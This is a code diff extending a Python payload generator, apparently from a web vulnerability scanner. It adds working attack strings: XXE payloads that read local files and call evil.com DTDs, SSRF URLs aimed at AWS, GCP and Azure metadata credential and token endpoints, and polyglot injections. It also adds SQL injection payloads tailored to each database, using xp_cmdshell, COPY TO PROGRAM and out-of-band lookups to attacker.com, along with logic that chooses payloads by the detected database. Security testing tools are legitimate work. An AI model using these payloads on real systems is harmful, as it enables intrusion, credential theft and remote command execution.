@@ -5,7 +5,10 @@ Generates context-aware payloads for vulnerability testing.
 """
 from typing import List, Dict, Any, Optional
 import json
+import logging
 from pathlib import Path
+
+logger = logging.getLogger(__name__)
 
 
 class PayloadGenerator:
@@ -323,6 +326,14 @@ class PayloadGenerator:
                 '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                 '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                 '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>',
+                # Parameter entity XXE
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://evil.com/xxe.dtd">%pe;%param;]>',
+                # Blind XXE with external DTD
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/blind.dtd">%dtd;]><foo>&send;</foo>',
+                # SVG-based XXE
+                '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg><text>&xxe;</text></svg>',
+                # XInclude
+                '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
             ],
 
             # SSRF Payloads
@@ -342,11 +353,21 @@ class PayloadGenerator:
                 "gopher://127.0.0.1:6379/_INFO",
             ],
             "ssrf_cloud": [
+                # AWS
                 "http://169.254.169.254/latest/meta-data/",
                 "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://169.254.169.254/latest/user-data",
+                "http://169.254.169.254/latest/meta-data/iam/info",
+                # GCP
                 "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-                "http://169.254.169.254/metadata/v1.json",
+                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+                "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
+                # Azure
                 "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+                # DigitalOcean
+                "http://169.254.169.254/metadata/v1.json",
+                "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address",
             ],
 
             # Open Redirect
@@ -786,6 +807,66 @@ class PayloadGenerator:
                 "<input accesskey=x onclick=alert(1)>",
                 "<a href=# accesskey=x onclick=alert(1)>press ALT+SHIFT+X</a>",
             ],
+
+            # ===== POLYGLOT PAYLOADS (multi-context) =====
+            "polyglot": [
+                "' OR 1=1--<script>alert(1)</script>",
+                "; ls<script>alert(1)</script>",
+                "'\"><script>alert(1)</script>",
+                "'; ls; SELECT * FROM users--",
+                "{{7*7}}<script>alert(1)</script>",
+                "' OR 1=1--{{7*7}}",
+                "<svg onload=alert(1)>'; DROP TABLE--",
+                "$(id)<img src=x onerror=alert(1)>",
+            ],
+
+            # ===== DB-SPECIFIC SQLi PAYLOADS =====
+            "sqli_mysql": [
+                "' OR 1=1#",
+                "' AND SLEEP(5)--",
+                "' OR BENCHMARK(10000000,MD5('A'))--",
+                "' UNION SELECT @@version,NULL--",
+                "/*!50000UNION*/ SELECT 1,2,3--",
+                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+                "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
+            ],
+            "sqli_postgres": [
+                "'; SELECT pg_sleep(5)--",
+                "' UNION SELECT version(),NULL--",
+                "' AND 1=CAST((SELECT version()) AS int)--",
+                "'; COPY (SELECT '') TO PROGRAM 'id'--",
+                "' UNION SELECT NULL,lo_import('/etc/passwd')--",
+                "' AND (SELECT pg_sleep(5)) IS NOT NULL--",
+            ],
+            "sqli_mssql": [
+                "'; WAITFOR DELAY '00:00:05'--",
+                "' AND 1=CONVERT(int,(SELECT @@version))--",
+                "'; EXEC xp_cmdshell 'whoami'--",
+                "' UNION SELECT @@version,NULL--",
+                "' AND 1=db_name()--",
+                "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
+            ],
+            "sqli_oracle": [
+                "' AND 1=UTL_INADDR.get_host_address('attacker.com')--",
+                "' UNION SELECT banner,NULL FROM v$version--",
+                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
+                "' AND (SELECT COUNT(*) FROM all_tables)>0--",
+                "' UNION SELECT username,NULL FROM all_users--",
+            ],
+            "sqli_sqlite": [
+                "' UNION SELECT sqlite_version(),NULL--",
+                "' UNION SELECT tbl_name,NULL FROM sqlite_master--",
+                "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
+                "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--",
+            ],
+            "sqli_mongodb": [
+                '{"$gt": ""}',
+                '{"$ne": ""}',
+                '{"$regex": ".*"}',
+                '{"$where": "sleep(5000)"}',
+                '{"$where": "this.password.match(/.*/)"}',
+            ],
         }
 
     def get_context_payloads(self, context: str) -> List[str]:
@@ -896,6 +977,50 @@ class PayloadGenerator:
                 unique.append(p)
         return unique
 
+    def _select_db_payloads(self, vuln_type: str, context: Dict[str, Any]) -> Optional[List[str]]:
+        """Select DB-specific payloads based on detected technology.
+
+        Checks context for database fingerprints and returns DB-specific
+        payloads instead of generic sqli_* payloads.
+        """
+        if "sqli" not in vuln_type:
+            return None
+
+        tech = (context.get("detected_technology") or "").lower()
+        error_msg = (context.get("error_message") or "").lower()
+
+        # Try injection_context.detect_db_type if we have error messages
+        if error_msg:
+            try:
+                from backend.core.vuln_engine.injection_context import detect_db_type
+                db_type = detect_db_type(error_msg)
+                if db_type:
+                    tech = db_type
+            except ImportError:
+                pass
+
+        db_map = {
+            "mysql": "sqli_mysql",
+            "mariadb": "sqli_mysql",
+            "postgres": "sqli_postgres",
+            "postgresql": "sqli_postgres",
+            "mssql": "sqli_mssql",
+            "microsoft sql": "sqli_mssql",
+            "sql server": "sqli_mssql",
+            "oracle": "sqli_oracle",
+            "sqlite": "sqli_sqlite",
+            "mongodb": "sqli_mongodb",
+            "mongo": "sqli_mongodb",
+        }
+
+        for keyword, payload_key in db_map.items():
+            if keyword in tech:
+                db_payloads = self.payload_libraries.get(payload_key, [])
+                if db_payloads:
+                    logger.debug(f"Using {payload_key} payloads for detected DB: {keyword}")
+                    return db_payloads
+        return None
+
     async def get_payloads(
         self,
         vuln_type: str,
@@ -913,7 +1038,9 @@ class PayloadGenerator:
         Returns:
             List of payloads to test
         """
-        base_payloads = self.payload_libraries.get(vuln_type, [])
+        # Try DB-specific payloads first for SQLi types
+        db_payloads = self._select_db_payloads(vuln_type, context)
+        base_payloads = db_payloads if db_payloads else self.payload_libraries.get(vuln_type, [])
 
         if not base_payloads:
             # Fallback to similar type
